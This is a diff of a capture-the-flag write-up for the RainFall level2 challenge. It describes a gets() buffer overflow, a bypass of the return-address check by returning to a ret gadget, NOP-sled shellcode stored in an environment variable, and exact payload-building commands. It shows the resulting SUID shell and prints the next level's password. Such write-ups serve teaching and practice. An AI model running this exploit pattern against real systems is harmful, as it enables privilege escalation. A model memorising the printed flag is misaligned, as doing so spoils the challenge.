@@ -1,18 +1,19 @@
-The disassembly gives:
-|           0x080484e7      eax = [src]
-|           0x080484ea      dword [esp] = eax                          ; char *s
-|           0x080484ed      sym.imp.gets ()                            ; char *gets(char *s)
+ 80484e7:	8d 45 b4             	lea    eax,[ebp-0x4c]
+ 80484ea:	89 04 24             	mov    DWORD PTR [esp],eax
+ 80484ed:	e8 ce fe ff ff       	call   80483c0 <gets@plt>
+
 
 `gets` being called, we can overwrite all the stack as we please.
 However this:
-|           0x080484f2      eax = dword [arg_4h]
-|           0x080484f5      dword [var_ch] = eax
-|           0x080484f8      eax = dword [var_ch]
-|           0x080484fb      eax &= 0xb0000000
-|           0x08048500      var = eax - 0xb0000000
-|       ,=< 0x08048505      if (var) goto 0x8048527
+ 80484f2:	8b 45 04             	mov    eax,DWORD PTR [ebp+0x4]
+ 80484f5:	89 45 f4             	mov    DWORD PTR [ebp-0xc],eax
+ 80484f8:	8b 45 f4             	mov    eax,DWORD PTR [ebp-0xc]
+ 80484fb:	25 00 00 00 b0       	and    eax,0xb0000000
+ 8048500:	3d 00 00 00 b0       	cmp    eax,0xb0000000
+ 8048505:	75 20                	jne    8048527 <p+0x53>
 
-tells us that the return address of the fonction p is checked against.
+
+tells us that the return address of the fonction p is checked.
 As the calling convention used here is defined, the return address of the fonction is located at ebp+0x4
 Its value is &'ed with 0xb0000000 to check the a potential address written over the stack isn't a stack/environment address.
 One way to counter this is to set the return_eip to the address of the instruction ret: 0x0804853e.
@@ -22,14 +23,46 @@ The next return address is in ebp+0x8.
 Since the buffer used by gets is located at ebp-0x4c, we have got 76 bytes to fill until we hit the saved ebp.
 After those bytes, we have got 4 bytes of the stored ebp to fill, then the return eip, then the second return eip.
 
-/tmp/script.sh > /tmp/input
-export SHELLCODE=`/tmp/shellcode.sh`
+We assemble our shellcode:
+nasm ./ressources/shellcode.asm
+[Upload the resulting ./ressources/shellcode to the vm at /tmp] : cat ../level1/flag | clipboard ; scp -P 4242 ./ressources/shellcode level2@rainfall:/tmp
 
-So after creating a script to make our input file, and exported a NOP-slided shellcode in the environment:
+export SHELLCODE="`python -c 'import sys; sys.stdout.write("\x90" * 90000)'``cat /tmp/shellcode`"
 
-cat /tmp/input - | ./level2
+We figure out the address of our shellcode:
+level2@RainFall:~$ gdb ./level2
+[Removed for readability]
+(gdb) start
+Temporary breakpoint 1 at 0x8048542
+Starting program: /home/user/level2/level2 
 
+Temporary breakpoint 1, 0x08048542 in main ()
+(gdb) print/x getenv("SHELLCODE")
+$1 = 0xbffe995f
+
+python -c 'import sys; sys.stdout.write("A" * 80)' > /tmp/input
+echo -ne '\x3e\x85\x04\x08' >> /tmp/input
+
+Now the shellcode addr with some offset:
+python -c 'import sys; sys.stdout.write("\x4f\x9A\xfe\xbf" * 100)' >> /tmp/input
+echo '' >> /tmp/input
+
+
+So after making our input file, and exporting a NOP-slided shellcode in the environment:
 we've got a SUID shell.
+
+level2@RainFall:~$ cat /tmp/input - | ./level2 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>AAAAAAAAAAAA>O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���O���
+asdf
+/bin//sh: 1: asdf: not found
+whoami
+level3
+cat /home/user/level3/.pass
+492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
+
+
+
+
 
 
 
